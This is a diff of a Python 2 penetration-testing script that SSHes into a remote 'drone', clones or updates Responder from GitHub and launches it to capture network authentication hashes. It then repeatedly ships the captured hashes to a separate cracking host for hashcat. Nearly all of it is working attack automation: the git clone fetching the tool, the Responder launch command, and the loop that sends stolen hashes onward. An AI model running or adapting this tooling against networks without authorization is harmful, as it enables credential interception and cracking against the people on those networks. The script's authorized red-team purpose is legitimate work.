@@ -49,14 +49,29 @@ def get_dronevpn_ips(args):
 
     return localip, droneip
 
+def run_drone_cmd(d_ssh, cmd):
+    print '[*] Running on drone: {}'.format(cmd)
+    stdin, stdout, stderr = d_ssh.exec_command(cmd)
+    return (stdin, stdout, stderr)
+
+def check_for_resp(d_ssh):
+    cmd = 'cd /opt/Responder'
+    stdin, stdout, stderr = run_drone_cmd(d_ssh, cmd)
+    cd_err = str(stderr.readlines())
+    if 'No such file or directory' in cd_err:
+        cmd = 'cd /opt/ && git clone https://github.com/SpiderLabs/Responder'
+        stdin, stdout, stderr = run_drone_cmd(d_ssh, cmd)
+    else:
+        cmd = 'cd /opt/Responder && git pull'
+        stdin, stdout, stderr = run_drone_cmd(d_ssh, cmd)
+
 def launch_responder(droneip, d_ssh):
     '''
     Launches Responder on the drone in a screen session
     '''
     # Open Responder in a screen session
     cmd = 'screen -S responder -dm python /opt/Responder/Responder.py -I eth0 -wf'
-    print '[*] Running on drone: {}'.format(cmd)
-    stdin, stdout, stderr = d_ssh.exec_command(cmd) 
+    stdin, stdout, stderr = d_ssh.exec_command(cmd)
     return (stdin, stdout, stderr)
 
 def get_cracker_creds():
@@ -179,6 +194,8 @@ def main(args):
 
     raw_input('[*] Hit [Enter] when you are connected to both the drone VPN and the Coalfire network')
     localip, droneip = get_dronevpn_ips(args)
+    print '[*] Local IP: {}'.format(localip)
+    print '[*] Drone IP: {}'.format(droneip)
 
     # Setup cracker scp
     c_user, c_pw = get_cracker_creds()
@@ -190,8 +207,11 @@ def main(args):
     d_ssh = ssh_client(droneip, 22, d_user, d_pw)
     d_scp = SCPClient(d_ssh.get_transport())
 
+    check_for_resp(d_ssh)
+
     #Launch responder on drone, rspndr = (stdin, stdout, stderr)
-    rspndr = launch_responder(droneip, d_ssh)
+    cmd = 'screen -S responder -dm python /opt/Responder/Responder.py -I eth0 -wf'
+    stdin, stdout, sterr = run_drone_cmd(d_ssh, cmd)
 
     # Check for new hashes and send them off
     while 1:
@@ -204,7 +224,8 @@ def main(args):
                     if h not in hash_files:
                         hash_files.append(h)
                 if len(sent_hashes) > 0:
-                    # sent_hashes = [(identifier, hash)], zip(*sent_hashes)[1] is just list of hashes
+                    # sent_hashes = [(identifier, hash)]
+                    # zip(*sent_hashes)[1] is just list of hashes
                     unsent = [h for h in hash_files if h not in zip(*sent_hashes)[1]]
                 else:
                     unsent = hash_files
@@ -217,7 +238,8 @@ def main(args):
             if ctrlc == False:
                 ctrlc = True
                 print '[*] Killing drone Responder session. Hit CTRL+C again to end script.'
-                d_ssh.exec_command("ps aux | grep -i 'screen -s responder' | grep -v grep | awk '{print $2}' | xargs kill -9")
+                d_ssh.exec_command("ps aux | grep -i 'screen -s responder' | grep -v grep | awk '{print $2}' | xargs kill")
+                d_ssh.exec_command("screen -wipe")
                 continue
             else:
                 sys.exit('[-] Goodbye. Any active hashcat sessions will continue running.')
